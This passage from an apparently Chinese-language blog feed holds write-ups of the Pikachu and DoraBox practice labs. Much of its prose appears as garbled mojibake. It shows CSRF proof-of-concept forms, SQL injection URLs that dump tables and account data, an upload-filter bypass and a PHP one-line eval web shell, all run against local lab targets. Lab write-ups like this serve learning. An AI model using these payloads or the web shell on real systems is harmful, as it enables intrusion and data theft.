å‡½æ•°åœ¨æ‰§è¡Œçš„æ—¶å€™å‡ºé”™äº†ã€‚</p>\n<p>ç¬¬ä¸€ååº”å°±æ˜¯ googleï¼Œç»“æœå¾—åˆ°çš„éƒ½æ˜¯å…¶ä»–æˆå“ç¨‹åºå‡ºç°äº†è¿™ä¸ªé”™è¯¯ã€‚è¿™æ—¶å€™è¿˜å¾—å»ç¿» php æ‰‹å†Œï¼Œæ ¹æ®æ‰‹å†Œçš„æè¿°ï¼ševal æ‰€æ‰§è¡Œçš„å­—ç¬¦ä¸²ï¼Œä¹Ÿå¾—å¿…é¡»æ»¡è¶³ php çš„è¯­æ³•è¦æ±‚ï¼Œå¾ˆæ˜æ˜¾æˆ‘çš„å­—ç¬¦ä¸²é‡Œé¢ç¼ºå°‘äº†æ‹¬å·å’Œæœ€åçš„åˆ†å·ã€‚</p>\n<p>æ‰€ä»¥æ»¡è¶³è¯­æ³•è§„åˆ™ï¼Œpayload æ›´æ”¹ä¸º phpinfo (); å³å¯</p>\n<p>è¿™çœŸçš„æ˜¯ç™½ç»™</p>\n<hr>\n<h2 id=\"æ€»ç»“-4\"><a class=\"markdownIt-Anchor\" href=\"#æ€»ç»“-4\">#</a> æ€»ç»“</h2>\n<p>(1)  ;</p>\n<p>åˆ†å·ï¼Œæ²¡æœ‰ä»»ä½•é€»è¾‘å…³ç³»çš„è¿æ¥ç¬¦ã€‚å½“å¤šä¸ªå‘½ä»¤ç”¨åˆ†å·è¿æ¥æ—¶ï¼Œå„å‘½ä»¤ä¹‹é—´çš„æ‰§è¡ŒæˆåŠŸä¸å¦å½¼æ­¤æ²¡æœ‰ä»»ä½•å½±å“ï¼Œéƒ½ä¼šä¸€æ¡ä¸€æ¡æ‰§è¡Œä¸‹å»ã€‚</p>\n<p>(2) ||</p>\n<p>é€»è¾‘æˆ–ï¼Œå½“ç”¨æ­¤è¿æ¥ç¬¦è¿æ¥å¤šä¸ªå‘½ä»¤æ—¶ï¼Œå‰é¢çš„å‘½ä»¤æ‰§è¡ŒæˆåŠŸï¼Œåˆ™åé¢çš„å‘½ä»¤ä¸ä¼šæ‰§è¡Œã€‚å‰é¢çš„å‘½ä»¤æ‰§è¡Œå¤±è´¥ï¼Œåé¢çš„å‘½ä»¤æ‰ä¼šæ‰§è¡Œã€‚</p>\n<p>(3) &amp;&amp;</p>\n<p>é€»è¾‘ä¸ï¼Œå½“ç”¨æ­¤è¿æ¥ç¬¦è¿æ¥å¤šä¸ªå‘½ä»¤æ—¶ï¼Œå‰é¢çš„å‘½ä»¤æ‰§è¡ŒæˆåŠŸï¼Œæ‰ä¼šæ‰§è¡Œåé¢çš„å‘½ä»¤ï¼Œå‰é¢çš„å‘½ä»¤æ‰§è¡Œå¤±è´¥ï¼Œåé¢çš„å‘½ä»¤ä¸ä¼šæ‰§è¡Œï¼Œä¸ || æ­£å¥½ç›¸åã€‚</p>\n<p>(4) |</p>\n<p>ç®¡é“ç¬¦ï¼Œå½“ç”¨æ­¤è¿æ¥ç¬¦è¿æ¥å¤šä¸ªå‘½ä»¤æ—¶ï¼Œå‰é¢å‘½ä»¤æ‰§è¡Œçš„æ­£ç¡®è¾“å‡ºï¼Œä¼šäº¤ç»™åé¢çš„å‘½ä»¤ç»§ç»­å¤„ç†ã€‚è‹¥å‰é¢çš„å‘½ä»¤æ‰§è¡Œå¤±è´¥ï¼Œåˆ™ä¼šæŠ¥é”™ï¼Œè‹¥åé¢çš„å‘½ä»¤æ— æ³•å¤„ç†å‰é¢å‘½ä»¤çš„è¾“å‡ºï¼Œä¹Ÿä¼šæŠ¥é”™ã€‚</p>\n<p>ä¾‹ ls | grep *.txt</p>\n<hr>\n<h1 id=\"csrf\"><a class=\"markdownIt-Anchor\" href=\"#csrf\">#</a> CSRF</h1>\n<h2 id=\"csrfget\"><a class=\"markdownIt-Anchor\" href=\"#csrfget\">#</a> csrf(get)</h2>\n<h3 id=\"è¿‡ç¨‹-17\"><a class=\"markdownIt-Anchor\" href=\"#è¿‡ç¨‹-17\">#</a> è¿‡ç¨‹</h3>\n<p>poc åœ¨ bp ä¸ŠæŠ“ request åŒ…ï¼Œè‡ªåŠ¨ç”Ÿæˆï¼š</p>\n<p><img src=\"pikachu-csrf-001.png\" alt=\"\"></p>\n<p>pocï¼Œåœ¨é‡Œé¢ä¿®æ”¹ä½ è¦æ”¹çš„å€¼:</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span>&gt;</span></span><br><span class=\"line\">  <span class=\"comment\">&lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"javascript\">history.pushState(<span class=\"string\">&#x27;&#x27;</span>, <span class=\"string\">&#x27;&#x27;</span>, <span class=\"string\">&#x27;/&#x27;</span>)</span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">form</span> <span class=\"attr\">action</span>=<span class=\"string\">&quot;http://www.pikachu.com/vul/csrf/csrfget/csrf_get_edit.php&quot;</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;hidden&quot;</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;sex&quot;</span> <span class=\"attr\">value</span>=<span class=\"string\">&quot;hehe&quot;</span> /&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;hidden&quot;</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;phonenum&quot;</span> <span class=\"attr\">value</span>=<span class=\"string\">&quot;123&quot;</span> /&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;hidden&quot;</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;add&quot;</span> <span class=\"attr\">value</span>=<span class=\"string\">&quot;hehe&quot;</span> /&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;hidden&quot;</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;email&quot;</span> <span class=\"attr\">value</span>=<span class=\"string\">&quot;12345678<span class=\"symbol\">&amp;#64;</span>&quot;</span> /&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;hidden&quot;</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;submit&quot;</span> <span class=\"attr\">value</span>=<span class=\"string\">&quot;submit&quot;</span> /&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;submit&quot;</span> <span class=\"attr\">value</span>=<span class=\"string\">&quot;Submit request&quot;</span> /&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">form</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>å‘ç»™ç”¨æˆ·ç‚¹å‡»æŒ‰é’®åè·³è½¬ï¼š</p>\n<p><img src=\"pikachu-csrf-002.png\" alt=\"\"></p>\n<p>ä¿®æ”¹æˆåŠŸ</p>\n<h2 id=\"csrfpost\"><a class=\"markdownIt-Anchor\" href=\"#csrfpost\">#</a> csrfï¼ˆpostï¼‰</h2>\n<h3 id=\"è¿‡ç¨‹-18\"><a class=\"markdownIt-Anchor\" href=\"#è¿‡ç¨‹-18\">#</a> è¿‡ç¨‹</h3>\n<p>å’Œ get ç›¸æ¯”ï¼Œå°±æ˜¯ action åé¢åŠ äº†ä¸ª method=â€œPOSTâ€ï¼Œç„¶åå°±æ˜¯ä¸€æ ·çš„æ“ä½œäº†</p>\n<p>pocï¼š</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span>&gt;</span></span><br><span class=\"line\">  <span class=\"comment\">&lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"javascript\">history.pushState(<span class=\"string\">&#x27;&#x27;</span>, <span class=\"string\">&#x27;&#x27;</span>, <span class=\"string\">&#x27;/&#x27;</span>)</span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">form</span> <span class=\"attr\">action</span>=<span class=\"string\">&quot;http://www.pikachu.com/vul/csrf/csrfpost/csrf_post_edit.php&quot;</span> <span class=\"attr\">method</span>=<span class=\"string\">&quot;POST&quot;</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;hidden&quot;</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;sex&quot;</span> <span class=\"attr\">value</span>=<span class=\"string\">&quot;1&quot;</span> /&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;hidden&quot;</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;phonenum&quot;</span> <span class=\"attr\">value</span>=<span class=\"string\">&quot;1&quot;</span> /&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;hidden&quot;</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;add&quot;</span> <span class=\"attr\">value</span>=<span class=\"string\">&quot;1&quot;</span> /&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;hidden&quot;</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;email&quot;</span> <span class=\"attr\">value</span>=<span class=\"string\">&quot;1&quot;</span> /&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;hidden&quot;</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;submit&quot;</span> <span class=\"attr\">value</span>=<span class=\"string\">&quot;submit&quot;</span> /&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;submit&quot;</span> <span class=\"attr\">value</span>=<span class=\"string\">&quot;Submit request&quot;</span> /&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">form</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"csrftokenæ²¡ç»•è¿‡å»å¯ä»¥ç”¨bpç»•æŠŠ\"><a class=\"markdownIt-Anchor\" href=\"#csrftokenæ²¡ç»•è¿‡å»å¯ä»¥ç”¨bpç»•æŠŠ\">#</a> csrf (token)ï¼ˆæ²¡ç»•è¿‡å»ï¼Ÿå¯ä»¥ç”¨ bp ç»•æŠŠï¼‰</h2>\n<h3 id=\"è¿‡ç¨‹-19\"><a class=\"markdownIt-Anchor\" href=\"#è¿‡ç¨‹-19\">#</a> è¿‡ç¨‹</h3>\n<p>æ²¡ç»•è¿‡å»ï¼Œä¸‹é¢æœ‰ä¸ªæœåŠ¡å™¨ç»™çš„éšè—çš„ token</p>\n<p>ï¼ˆè¿™é‡Œå¯ä»¥åˆ©ç”¨ bp è‡ªå¸¦çš„åŠŸèƒ½ï¼Œå°†è¿”å›æ•°æ®åŒ…ä¸­çš„ token æ•°æ®è®¾ç½®ä¸ºä¸‹ä¸€è¯·æ±‚æ•°æ®åŒ…çš„å‚æ•°ï¼‰</p>\n<h3 id=\"æ€»ç»“-5\"><a class=\"markdownIt-Anchor\" href=\"#æ€»ç»“-5\">#</a> æ€»ç»“ï¼š</h3>\n<p>æ€»ç»“ä¹‹ä¸çŸ¥é“è‡ªå·±å½“æ—¶åœ¨æƒ³ä»€ä¹ˆå¯¼è‡´åªèƒ½æµ‘æ°´æ‘¸é±¼ç³»åˆ—â—” â€¸â—”</p>\n<hr>\n<h2 id=\"æœ€åæƒ³è¯´çš„è¯\"><a class=\"markdownIt-Anchor\" href=\"#æœ€åæƒ³è¯´çš„è¯\">#</a> æœ€åæƒ³è¯´çš„è¯</h2>\n<p>åªè¦èŠ±æ—¶é—´å»åŠªåŠ›ï¼ŒçœŸçš„ä¼šå˜å¼ºçš„ï¼ï¼ï¼</p>\n<p>çœ‹è§è‡ªå·±ä»¥å‰å†™çš„æ–‡ç« ï¼Œè«åè½æ³ª</p>\n<p>ã€‚</p>\n<p>çªç„¶æƒ³æ¥ä¸€ä¸ªä¸æ˜è§‰å‰ãƒ½ (âœ¿ï¾Ÿâ–½ï¾Ÿ) ãƒ</p>\n<p>çªç„¶ä¼¤æ„Ÿæ°›å›´æ‰“ç ´</p>\n",
            "tags": [
                "pikachu,webé¶åœº"
            ]
        },
        {
            "id": "http://example.com/2020/10/15/dmx/dorabox%E5%86%92%E9%99%A9%E6%89%8B%E8%AE%B0/",
            "url": "http://example.com/2020/10/15/dmx/dorabox%E5%86%92%E9%99%A9%E6%89%8B%E8%AE%B0/",
            "title": "doraboxå†’é™©æ‰‹è®°",
            "date_published": "2020-10-15T08:40:33.000Z",
            "content_html": "<h1 id=\"sqliå­—ç¬¦å‹\"><a class=\"markdownIt-Anchor\" href=\"#sqliå­—ç¬¦å‹\">#</a> SQLi å­—ç¬¦å‹</h1>\n<h2 id=\"è¿‡ç¨‹\"><a class=\"markdownIt-Anchor\" href=\"#è¿‡ç¨‹\">#</a> è¿‡ç¨‹ï¼š</h2>\n<p>å­—ç¬¦å‹å’Œæ•°å­—å‹ç›¸æ¯”ï¼Œå°±æ˜¯è¦é—­åˆå•å¼•å·å§</p>\n<ol>\n<li>\n<p>å•å¼•å·é—­åˆï¼Œ# ç”¨ url ç¼–ç  %23ï¼š</p>\n<p><code>http://localhost/dorabox/sql_injection/sql_string.php ?title=1' or 1=1 %23' &amp;submit=submit</code> <img src=\"dorabox_sqlchar002.png\" alt=\"\"></p>\n<p>ä¸‹é¢å°±æ˜¯å’Œæ•°å­—å‹æ³¨å…¥ç›¸åŒçš„æ“ä½œã€‚</p>\n</li>\n<li>\n<p>åˆ©ç”¨ order by æˆ–è€… group by åˆ¤æ–­å­—æ®µæ•°ï¼š</p>\n<p>æ­£å¸¸ï¼š <code>http://localhost/dorabox/sql_injection/sql_string.php ?title=1' or 1=1 order by 3 %23' &amp;submit=submit</code></p>\n<p>æŠ¥é”™ï¼š <code>http://localhost/dorabox/sql_injection/sql_string.php</code> <br>\n?title=1â€™ or 1=1 order by 4 %23â€™<br>\n&amp;submit=submit</p>\n<p>ä»¥ä¸Šè¯´æ˜éœ€è¦ 3 ä¸ªå­—æ®µ</p>\n</li>\n<li>\n<p>çˆ†è¯¥æ•°æ®åº“æ‰€æœ‰è¡¨å’Œ news è¡¨æœ‰å¤šå°‘æ¡æ•°æ®</p>\n<p><code>http://localhost/dorabox/sql_injection/sql_string.php ?title=1' union select  1,(select table_rows from information_schema.tables where table_name='news' and table_schema = database()),(select group_concat(table_name) from information_schema.tables where table_schema = database())  %23' &amp;submit=submit</code></p>\n<p>å› ä¸ºæ²¡æœ‰ title ä¸ºâ€™1â€™çš„æ–‡ç« ï¼Œæ‰€ä»¥ç›´æ¥åªä¼šå‡ºåé¢æ”»å‡»æ‰€å¾—æ•°æ®<img src=\"dorabox_sqlchar003.png\" alt=\"\"></p>\n<p>æ³¨å…¥çš„ä¸‰ä¸ªå­—æ®µï¼š</p>\n<ul>\n<li>\n<p>1 å¹¶ä¸ä¼šè¾“å‡ºï¼Œæ‰€ä»¥éšæ„</p>\n</li>\n<li>\n<p>(select table_rows from information_schema.tables where table_name=â€˜newsâ€™ and table_schema = database ()) ï¼Œç”¨äºç»Ÿè®¡è¯¥è¡¨çš„æ•°æ®æ•°é‡ï¼Œæ²¡ä»€ä¹ˆç”¨ï¼Œå°±æ˜¯æƒ³è¯•è¯•çœ‹</p>\n</li>\n<li>\n<p>(select group_concat (table_name) from information_schema.tables where table_schema = database ())ï¼Œåˆ©ç”¨ group_concat () æ‹¼æ¥å­—ç¬¦ä¸²çˆ†è¡¨å</p>\n</li>\n</ul>\n</li>\n<li>\n<p>çˆ†å­—æ®µ</p>\n<p><code>http://localhost/dorabox/sql_injection/sql_string.php ?title=1' union  select 1, 2,group_concat(column_name) from information_schema.columns where table_name = 'account' and table_schema = database() %23' &amp;submit=submit</code></p>\n<p><img src=\"dorabox_sqlchar004.png\" alt=\"\"></p>\n</li>\n<li>\n<p>çˆ†å†…å®¹</p>\n<p><code>http://localhost/dorabox/sql_injection/sql_string.php ?title=1' union  select 1, 2,concat_ws('-',id,rest,own) from account %23' &amp;submit=submit</code></p>\n<p><img src=\"dorabox_sqlchar005.png\" alt=\"\"></p>\n</li>\n</ol>\n<h2 id=\"æ€»ç»“\"><a class=\"markdownIt-Anchor\" href=\"#æ€»ç»“\">#</a> æ€»ç»“ï¼š</h2>\n<p>åœ¨ sql æ³¨å…¥ä¸­ï¼Œæ³¨é‡Šå¸¸ç”¨â€™â€“+â€™ï¼Œè€Œæ³¨é‡Šç¬¦â€™#â€˜å’Œâ€™â€“' ä¸€èˆ¬ä¸èƒ½ç›´æ¥ä½¿ç”¨ã€‚</p>\n<ul>\n<li>â€˜#â€™ï¼šsql æ‰‹å·¥æ³¨å…¥æ—¶ï¼Œæµè§ˆå™¨åœ°å€æ è¾“å…¥çš„ 'ï¼ƒ' å¹¶æ²¡æœ‰å‘é€åˆ°åå°ï¼Œå› ä¸º url ä¸­ #å·æ˜¯ç”¨æ¥æŒ‡å¯¼æµè§ˆå™¨åŠ¨ä½œçš„ï¼ˆä¾‹å¦‚é”šç‚¹ï¼‰ï¼Œå¯¹æœåŠ¡å™¨ç«¯å®Œå…¨æ— ç”¨ï¼Œ# çš„ url ç¼–ç æ˜¯ %23ï¼Œæ›¿æ¢åå¯è¡Œ</li>\n<li>â€˜â€“â€™ï¼šåœ¨å­—ç¬¦å‹æ³¨å…¥æ—¶ï¼Œâ€“å’Œå•å¼•å·è¿æ¥åœ¨ä¸€èµ·æ—¶ï¼Œæ— æ³•å½¢æˆæœ‰æ•ˆçš„ mysql è¯­å¥ï¼Œå¯èƒ½é€ æˆå•å¼•å·æœªé—­åˆé”™è¯¯ã€‚æ‰€ä»¥å¯ä»¥ä½¿ç”¨â€“â€™ï¼Œä¹Ÿå¯ä»¥å°è¯•ç”¨å¤šè¡Œæ³¨é‡Šç¬¦ï¼ˆå—æ³¨é‡Šç¬¦ /**/ï¼‰ã€ä¸€å¯¹è‹±æ–‡æ‹¬å·ã€æ¢è¡Œç¬¦æˆ–åŠ å·æ¥ä»£æ›¿ç©ºæ ¼</li>\n</ul>\n<h1 id=\"sqliæœç´¢å‹\"><a class=\"markdownIt-Anchor\" href=\"#sqliæœç´¢å‹\">#</a> SQLi æœç´¢å‹</h1>\n<p>ç±»ä¼¼å­—ç¬¦å‹æ³¨å…¥ï¼Œä¸»è¦å°±æ˜¯é—­åˆ</p>\n<p><img src=\"dorabox_sqlss001.png\" alt=\"\"></p>\n<h2 id=\"è¿‡ç¨‹-2\"><a class=\"markdownIt-Anchor\" href=\"#è¿‡ç¨‹-2\">#</a> è¿‡ç¨‹ï¼š</h2>\n<ol>\n<li>\n<p>è¿›è¡Œé—­åˆ</p>\n<p>â€˜<a href=\"http://localhost/dorabox/sql_injection/sql_search.php\">http://localhost/dorabox/sql_injection/sql_search.php</a><br>\n?content=â€™ or â€˜%â€™=â€™<br>\n&amp;submit=submitâ€™</p>\n<p><img src=\"dorabox_sqlss002.png\" alt=\"\"></p>\n</li>\n<li>\n<p>åˆ¤æ–­éœ€è¦çš„å­—æ®µæ•° 3 ä¸ªï¼ˆæ„Ÿè§‰è¿™ç§æ–¹æ³•æœ‰ç‚¹ä½çº§ï¼‰</p>\n<p><code>http://localhost/dorabox/sql_injection/sql_search.php ?content=' union select 1,2,3 and '%'='  &amp;submit=submit</code></p>\n<p><img src=\"dorabox_sqlss003.png\" alt=\"\"></p>\n</li>\n<li>\n<p>çˆ†è¡¨ï¼Œå¸¸è§„æ‰‹æ®µ</p>\n<p><code>SELECT * FROM news WHERE content like '%$$$$$$' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() and '%'=' %'</code></p>\n<p><img src=\"dorabox_sqlss004.png\" alt=\"\"></p>\n</li>\n<li>\n<p>çˆ†å­—æ®µ</p>\n<p><code>http://localhost/dorabox/sql_injection/sql_search.php ?content=$$$$$$' union select 1,2, group_concat(column_name) from information_schema.columns where table_schema=database() and table_name = 'account' and '%'=' &amp;submit=submit</code></p>\n<p><img src=\"dorabox_sqlss005.png\" alt=\"\"></p>\n</li>\n<li>\n<p>çˆ†å†…å®¹</p>\n<p><code>http://localhost/dorabox/sql_injection/sql_search.php ?content=$$$$$$' union select 1,2, concat_ws('--',id,rest,own) from account where '%'=' &amp;submit=submit</code></p>\n<p><img src=\"dorabox_sqlss006.png\" alt=\"\"></p>\n</li>\n</ol>\n<h2 id=\"æ€»ç»“-2\"><a class=\"markdownIt-Anchor\" href=\"#æ€»ç»“-2\">#</a> æ€»ç»“ï¼š</h2>\n<p>sql é€šé…ç¬¦</p>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:left\">é€šé…ç¬¦</th>\n<th style=\"text-align:left\">æè¿°</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:left\">%</td>\n<td style=\"text-align:left\">æ›¿ä»£ 0 ä¸ªæˆ–å¤šä¸ªå­—ç¬¦</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">_</td>\n<td style=\"text-align:left\">æ›¿ä»£ä¸€ä¸ªå­—ç¬¦</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">[<em>charlist</em>]</td>\n<td style=\"text-align:left\">å­—ç¬¦åˆ—ä¸­çš„ä»»ä½•å•ä¸€å­—ç¬¦</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">[^<em>charlist</em>] æˆ– [!<em>charlist</em>]</td>\n<td style=\"text-align:left\">ä¸åœ¨å­—ç¬¦åˆ—ä¸­çš„ä»»ä½•å•ä¸€å­—ç¬¦</td>\n</tr>\n</tbody>\n</table>\n<h1 id=\"jsé™åˆ¶æ–‡ä»¶ä¸Šä¼ \"><a class=\"markdownIt-Anchor\" href=\"#jsé™åˆ¶æ–‡ä»¶ä¸Šä¼ \">#</a> JS é™åˆ¶æ–‡ä»¶ä¸Šä¼ </h1>\n<p>å‰ç«¯è¿›è¡Œäº†æ–‡ä»¶ååç¼€è¿‡æ»¤</p>\n<p><img src=\"dorabox_fp_js003.png\" alt=\"\"></p>\n<h2 id=\"è¿‡ç¨‹-3\"><a class=\"markdownIt-Anchor\" href=\"#è¿‡ç¨‹-3\">#</a> è¿‡ç¨‹ï¼š</h2>\n<ol>\n<li>æ‰“å¼€æºä»£ç ï¼ŒæŠŠè“è‰²æ¡†éƒ¨åˆ†å†…å®¹åˆ é™¤ï¼Œå³ç»•è¿‡éªŒè¯å‡½æ•°<img src=\"dorabox_fp_js002.png\" alt=\"\"></li>\n<li>ä¸Šä¼ æˆåŠŸï¼Œè·¯å¾„å‘Šè¯‰äº†ï¼Œèœåˆ€ç›´è¿</li>\n</ol>\n<p><img src=\"dorabox_fp_js001.png\" alt=\"\"></p>\n<h2 id=\"æ€»ç»“-3\"><a class=\"markdownIt-Anchor\" href=\"#æ€»ç»“-3\">#</a> æ€»ç»“ï¼š</h2>\n<p>é‡è§äº†ä¸€ä¸ªé—®é¢˜ï¼Œè¿˜æ²¡æœ‰è§£å†³ï¼š</p>\n<p>ä¸ºä»€ä¹ˆä¿®æ”¹ js ä»£ç ï¼ŒåŠ ä¸Š |.php ä¸ç”Ÿæ•ˆï¼Œè€Œåˆ é™¤å‡½æ•°éªŒè¯ä¸€æ”¹ä¸€ä¸ªå‡†ï¼Ÿ</p>\n<p>æ®è¯´å°±æ˜¯ä¸å¯ä»¥æ”¹ï¼ˆå°èœèœï¼Œè¦åœ¨å‰ç«¯æ§åˆ¶å°è¾“å…¥è¯¥å‡½æ•°ï¼Œæ‰ä¼šç”Ÿæ•ˆï¼‰</p>\n<h1 id=\"ä»»æ„æ–‡ä»¶ä¸Šä¼ \"><a class=\"markdownIt-Anchor\" href=\"#ä»»æ„æ–‡ä»¶ä¸Šä¼ \">#</a> ä»»æ„æ–‡ä»¶ä¸Šä¼ </h1>\n<p>éšä¾¿ä¼ </p>\n<p><img src=\"dorabox_fp_all001.png\" alt=\"\"></p>\n<h2 id=\"è¿‡ç¨‹-4\"><a class=\"markdownIt-Anchor\" href=\"#è¿‡ç¨‹-4\">#</a> è¿‡ç¨‹ï¼š</h2>\n<p>æ ¹æ®é¢˜ç›®æç¤ºï¼Œè·å–åˆ°æ–‡ä»¶ä¸Šä¼ çš„è·¯å¾„ï¼Œç”¨èœåˆ€ç›´æ¥è¿æ¥</p>\n<p><img src=\"dorabox_fp_all002.png\" alt=\"\"></p>\n<p>ä¸Šä¼ çš„ php ä¸€å¥è¯æœ¨é©¬ attack.phpï¼š</p>\n<p><code> &lt;?php @eval($_POST['attack']) ?&gt;</code></p>\n<h2 id=\"æ€»ç»“-4\"><a class=\"markdownIt-Anchor\" href=\"#æ€»ç»“-4\">#</a> æ€»ç»“ï¼š</h2>\n<ol>\n<li>\n<p>php ä¸€å¥è¯æœ¨é©¬åŸºæœ¬åŸç†ï¼š</p>\n<ul>\n<li>@è¡¨ç¤ºåé¢å³ä½¿æ‰§è¡Œé”™è¯¯ï¼Œä¹Ÿä¸æŠ¥é”™ ($_POST [attack] å¦‚æœä¸åŠ  @ä¼šæŠ¥é”™ï¼Œå› ä¸º attack å˜é‡æ²¡æœ‰å®šä¹‰å°±è¢«ä½¿ç”¨äº†ï¼ŒæŠ¥é”™ä¼šæš´éœ²å¯†ç )</li>\n<li>eval () å‡½æ•°ï¼Œæ‹¬å·å†…çš„è¯­å¥å­—ç¬¦ä¸²ä»€ä¹ˆçš„éƒ½å½“åšä»£ç æ‰§è¡Œ</li>\n<li>$_POST [â€˜attackâ€™] è¡¨ç¤ºä»¥ post çš„æ–¹å¼æ¥æ”¶å˜é‡ attackï¼ŒæŠŠå˜é‡ attack é‡Œé¢çš„å­—ç¬¦ä¸²å½“åš php ä»£ç æ‰§è¡Œã€‚ä¾‹å¦‚ï¼Œè‹¥æ¥æ”¶åˆ°å‚æ•° attack=echo â€˜attackâ€™ï¼Œæ­¤æ—¶ä»£ç å˜ä¸º eval (â€œecho â€˜attackâ€™;â€)ï¼Œå°±ä¼šè¾“å‡º attack</li>\n</ul>\n</li>\n<li>\n<p>TruBW åšä¸»ä¸¾çš„å¸¸ç”¨çš„æ–¹æ³•ï¼š</p>\n<blockquote>\n<p>ä½ æƒ³æŸ¥çœ‹ç›®æ ‡ç¡¬ç›˜é‡Œæœ‰æ²¡æœ‰å°é»„ç‰‡ï¼Œå¯ä»¥ç”¨ php å‡½æ•°ï¼š <code>opendir()</code>  å’Œ <code>readdir()</code>  ç­‰ç­‰ã€‚æƒ³ä¸Šä¼ ç‚¹å°é»„ç‰‡ï¼Œè¯¬é™·ç«™ä¸»ï¼Œå°±ç”¨ php å‡½æ•°ï¼š <code>move_uploaded_file</code> ï¼Œå½“ç„¶ç›¸åº”çš„ html è¦å†™å¥½ã€‚ä½ æƒ³æ‰§è¡Œ cmd å‘½ä»¤ï¼Œåˆ™ç”¨ <code>exec()</code> ã€‚</p>\n</blockquote>\n</li>\n</ol>\n<h1 id=\"mimeé™åˆ¶æ–‡ä»¶ä¸Šä¼ \"><a class=\"markdownIt-Anchor\" href=\"#mimeé™åˆ¶æ–‡ä»¶ä¸Šä¼ \">#</a> MIME é™åˆ¶æ–‡ä»¶ä¸Šä¼ </h1>\n<p>.jpg å¯ä»¥ä¸Šä¼ æˆåŠŸ</p>\n<p><img src=\"dorabox_fp_mime001.png\" alt=\"\"></p>\n<h2 id=\"è¿‡ç¨‹-5\"><a 